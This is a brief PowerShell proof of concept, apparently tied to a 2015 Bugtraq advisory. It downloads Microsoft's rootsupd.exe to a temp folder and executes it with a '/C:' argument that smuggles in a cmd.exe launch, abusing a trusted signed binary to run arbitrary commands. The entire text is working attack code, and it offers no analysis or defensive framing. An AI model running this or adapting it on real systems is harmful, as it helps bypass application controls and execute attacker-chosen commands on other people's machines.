# http://seclists.org/bugtraq/2015/Sep/24

$fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
$fileDownloaded = "C:\Windows\temp\rootsupd.exe" 
     
$client = new-object System.Net.WebClient 
$client.DownloadFile($fileToDownload, $fileDownloaded) 
      
&$fileDownloaded "/C:c:\windows\system32\cmd.exe /K Title Follow The White Rabbit ;-)"